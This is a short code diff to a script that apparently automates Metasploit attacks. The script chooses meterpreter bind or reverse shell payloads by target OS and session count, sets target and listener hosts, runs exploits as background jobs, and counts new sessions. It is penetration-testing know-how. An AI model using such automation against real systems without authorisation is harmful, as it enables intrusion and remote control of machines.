@@ -120,7 +120,12 @@ sub getBin {
 
 sub determinePayload {
    if ($1 == "windows") {
-      return "windows/meterpreter/reverse_tcp";
+      if ($2 != 0) {
+         return "windows/meterpreter/bind_tcp";
+      }
+      else {
+         return "windows/meterpreter/reverse_tcp";
+      }
    }
    return "cmd/unix/reverse";
 }
@@ -174,7 +179,7 @@ on launch_attacks {
          cmd($console, "use $exploit");
 
          if ($payload eq "") {
-            $payload = determinePayload($os);
+            $payload = determinePayload($os, $numSessions);
          }
 
          if ($os ne "multi") {
@@ -184,7 +189,7 @@ on launch_attacks {
          cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
          cmd($console, "exploit -j");
       
-         sleep(10000);
+         sleep(15000);
          cmd($console, "jobs -K");
          sleep(1000);
          if (size(sessions()) > $numSessions) {
